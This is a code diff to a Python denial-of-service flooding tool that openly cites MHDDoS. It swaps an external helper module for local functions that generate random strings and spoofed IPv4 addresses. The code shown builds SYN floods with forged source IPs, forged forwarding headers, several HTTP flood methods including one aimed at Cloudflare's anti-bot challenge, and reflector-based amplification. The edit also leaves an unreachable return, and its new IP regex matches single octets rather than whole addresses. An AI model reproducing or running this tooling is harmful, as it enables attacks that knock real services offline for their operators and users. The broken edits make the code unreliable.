@@ -1,4 +1,6 @@
 import asyncio
+import random
+import re
 from contextlib import suppress
 from copy import copy
 import errno
@@ -11,7 +13,7 @@ from random import choice
 from secrets import choice as randchoice
 from socket import (
     AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
-    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket
+    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket, inet_ntoa
 )
 from ssl import CERT_NONE, SSLContext, create_default_context
 from sys import exit as _exit
@@ -19,12 +21,13 @@ from threading import Event
 from time import sleep, time
 from typing import Any, List, Optional, Set, Tuple
 from urllib import parse
+from string import ascii_letters
+from struct import pack as data_pack
 
 import aiohttp
 import aiohttp_socks
 from async_timeout import timeout
 from cloudscraper import create_scraper
-from python_socks.async_.asyncio import Proxy
 from requests import Response, Session, cookies
 from yarl import URL
 
@@ -33,7 +36,6 @@ from .core import cl, logger, ROOT_DIR, Stats
 from .proxies import ProxySet, NoProxySet
 
 from . import proto
-from . import proxy_tools as ProxyTools
 from .proto import FloodIO, FloodOp, FloodSpec
 from .referers import REFERERS
 from .useragents import USERAGENTS
@@ -121,10 +123,6 @@ class Tools:
         return size
 
     @staticmethod
-    def randchr(lengh: int) -> str:
-        return str(ProxyTools.Random.rand_str(lengh)).strip()
-
-    @staticmethod
     def parse_params(url, ip, proxies):
         result = url.host.lower().endswith(rotate_suffix)
         if result:
@@ -202,6 +200,16 @@ class Tools:
     def safe_close(sock=None):
         if sock:
             sock.close()
+
+    @staticmethod
+    def rand_str(length=16):
+        return ''.join(random.choices(ascii_letters, k=length))
+
+    @staticmethod
+    def rand_ipv4():
+        return inet_ntoa(
+            data_pack('>I', random.randint(1, 0xffffffff))
+        )
 
 
 # noinspection PyBroadException,PyUnusedLocal
@@ -362,12 +370,12 @@ class Layer4:
 
     def _generate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(ProxyTools.Random.rand_ipv4())
+        ip.set_ip_src(Tools.rand_ipv4())
         ip.set_ip_dst(self._target[0])
         tcp: TCP = TCP()
         tcp.set_SYN()
         tcp.set_th_dport(self._target[1])
-        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
+        tcp.set_th_sport(random.randint(1, 65535))
         ip.contains(tcp)
         return ip.get_packet()
 
@@ -450,7 +458,7 @@ class HttpFlood:
 
     @property
     def SpoofIP(self) -> str:
-        spoof: str = ProxyTools.Random.rand_ipv4()
+        spoof: str = Tools.rand_ipv4()
         return ("X-Forwarded-Proto: Http\r\n"
                 f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                 f"Via: {spoof}\r\n"
@@ -512,8 +520,7 @@ class HttpFlood:
             "From: googlebot(at)googlebot.com\r\n"
             "User-Agent: %s\r\n" % randchoice(google_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n"
-            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
-                                          ProxyTools.Random.rand_str(4)) +
+            "If-None-Match: %s-%s\r\n" % (Tools.rand_str(9), Tools.rand_str(4)) +
             "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
         s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
@@ -769,7 +776,7 @@ class AsyncTcpFlood(HttpFlood):
         finally:
             await self._close_connection(writer)
         return packets_sent > 0
-    
+
     # XXX: get rid of RPC param when OVH is gone
     async def _generic_flood_proto(
         self,
@@ -840,7 +847,8 @@ class AsyncTcpFlood(HttpFlood):
             ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
+             '{"data": %s}') % Tools.rand_str(32))[:-2]
+        return await self._generic_flood(payload)
         return await self._generic_flood_proto(payload, on_connect=on_connect)
 
     async def STRESS(self, on_connect=None) -> bool:
@@ -848,7 +856,7 @@ class AsyncTcpFlood(HttpFlood):
             (f"Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
+             '{"data": %s}') % Tools.rand_str(512))[:-2]
         return await self._generic_flood_proto(payload, on_connect=on_connect)
 
     async def COOKIES(self, on_connect=None) -> bool:
@@ -857,8 +865,7 @@ class AsyncTcpFlood(HttpFlood):
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
-            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
-             ProxyTools.Random.rand_str(32))
+            (random.randint(1000, 99999), Tools.rand_str(6), Tools.rand_str(32))
         )
         return await self._generic_flood_proto(payload, on_connect=on_connect)
 
@@ -877,8 +884,7 @@ class AsyncTcpFlood(HttpFlood):
              "<params><param><value><string>%s</string></value>"
              "</param><param><value><string>%s</string>"
              "</value></param></params></methodCall>") %
-            (ProxyTools.Random.rand_str(64),
-             ProxyTools.Random.rand_str(64)))[:-2]
+            (Tools.rand_str(64), Tools.rand_str(64)))[:-2]
         return await self._generic_flood_proto(payload, on_connect=on_connect)
 
     async def PPS(self, on_connect=None) -> bool:
@@ -889,7 +895,7 @@ class AsyncTcpFlood(HttpFlood):
     async def DYN(self, on_connect=None) -> bool:
         payload: bytes = str.encode(
             self._payload +
-            "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
+            "Host: %s.%s\r\n" % (Tools.rand_str(6), self._target.authority) +
             self.randHeadercontent +
             "\r\n"
         )
@@ -899,7 +905,7 @@ class AsyncTcpFlood(HttpFlood):
         payload: bytes = str.encode(
             "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                           self._target.raw_path_qs,
-                                          ProxyTools.Random.rand_str(6)) +
+                                          Tools.rand_str(6)) +
             "Host: %s\r\n" % self._target.authority +
             self.randHeadercontent +
             'Accept-Encoding: gzip, deflate, br\r\n'
@@ -929,9 +935,9 @@ class AsyncTcpFlood(HttpFlood):
     async def BYPASS(self, on_connect=None) -> bool:
         connector = self._proxies.pick_random_connector()
         packets_sent = 0
-        timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
-            self._stats.track_open_connection() # not exactly the connection though
+        cl_timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
+        async with aiohttp.ClientSession(connector=connector, timeout=cl_timeout) as s:
+            self._stats.track_open_connection()  # not exactly the connection though
             if not on_connect.cancelled():
                 on_connect.set_result(True)
             try:
@@ -945,7 +951,7 @@ class AsyncTcpFlood(HttpFlood):
             finally:
                 self._stats.track_close_connection()
         return packets_sent > 0
-    
+
     async def CFBUAM(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
@@ -1010,7 +1016,7 @@ class AsyncTcpFlood(HttpFlood):
                 # XXX: note this weid break in the middle of the code:
                 #        https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L1072
                 #      this attack has to be re-tested
-                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                keep = str.encode("X-a: %d\r\n" % random.randint(1, 5000))
                 yield FloodOp.WRITE, (keep, len(keep))
                 yield FloodOp.SLEEP, delay
 
@@ -1084,7 +1090,7 @@ def main(url, ip, method, event, proxies, stats, refl_li_fn=None, loop=None, set
             url,
             ip,
             method,
-            None, # XXX: previously used for "rpc"
+            None,  # XXX: previously used for "rpc"
             event,
             USERAGENTS,
             REFERERS,
@@ -1115,7 +1121,7 @@ def main(url, ip, method, event, proxies, stats, refl_li_fn=None, loop=None, set
             with refl_li.open("r+") as f:
                 ref = set(
                     a.strip()
-                    for a in ProxyTools.Patterns.IP.findall(f.read())
+                    for a in re.findall("(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)", f.read())
                 )
             if not ref:
                 exit("Empty Reflector File ")
